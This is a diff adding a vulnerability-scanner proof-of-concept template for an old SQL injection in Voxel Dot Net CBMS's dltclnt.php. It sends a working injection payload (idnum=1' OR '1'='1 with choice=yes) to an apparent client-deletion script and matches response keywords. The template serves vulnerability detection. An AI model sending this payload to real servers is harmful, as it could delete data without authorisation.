@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "检测 Voxel Dot Net CBMS 0.7 及更早版本中 dltclnt.php 的 SQL 注入漏洞，通过构造带 SQL 注入载荷的 idnum 参数请求，观察响应特征验证漏洞存在。"
+id = "POC-AVE-2002-0491"
+name = "Voxel Dot Net CBMS SQL Injection PoC"
+severity = "high"
+tags = ["ave-2002-0491"]
+vuln_id = [
+    "CVE-2002-0961",
+    "AVE-2002-0491",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/dltclnt.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "choice=yes&idnum=1'%20OR%20'1'%3D'1"
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "client",
+    "delete",
+    "CBMS",
+]
